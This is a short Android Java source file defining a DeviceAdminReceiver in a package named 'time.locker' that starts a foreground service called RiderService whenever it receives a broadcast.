package time.locker;

import android.app.*;
import android.os.*;
import android.app.admin.*;
import android.content.*;
import android.content.pm.*;
import android.widget.*;

public class MyDeviceAdminReceiver extends DeviceAdminReceiver {						

	@Override
    public void onReceive(Context context, Intent intent) {			
		super.onReceive(context, intent);				
        Intent serviceIntent = new Intent(context, RiderService.class);            		
		context.startForegroundService(serviceIntent);                   
    }
}
